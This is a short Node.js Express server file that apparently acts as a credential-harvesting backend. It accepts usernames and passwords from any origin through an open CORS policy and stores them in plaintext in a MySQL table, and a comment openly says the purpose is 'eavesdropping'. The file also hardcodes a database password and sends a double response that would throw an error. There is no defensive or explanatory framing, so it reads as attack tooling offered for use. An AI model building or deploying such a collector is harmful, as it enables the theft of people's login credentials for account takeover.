const express = require('express');
const mysql = require('mysql');
const cors = require('cors');
const app = express();

const connection = mysql.createConnection({
    host: 'localhost',
    user: 'credentialsStorage',
    password: 'Abcd1234',
    database: 'storedCredentials'
});

connection.connect((err) => {
    if(err) {
        console.error('Error connecting to database: ' + err.stack);
        return;
    }
  
    console.log('Connected to database as id ' + connection.threadId);
});

app.use(express.json());
// accept credentials from any host...
app.use(cors({
    origin: '*'
}));

app.post('/storeCredentials', (req, res) => {
    const { username, password } = req.body;

    connection.query('INSERT INTO accounts SET ?', { username, password }, (err, result) => {
        // we don't really care if the credentials were inserted successfully - after all, we're eavesdropping!
        res.send('""');
        res.status(201).end();
    });
});

app.listen(3000, () => {
    console.log('Server listening on port 3000');
});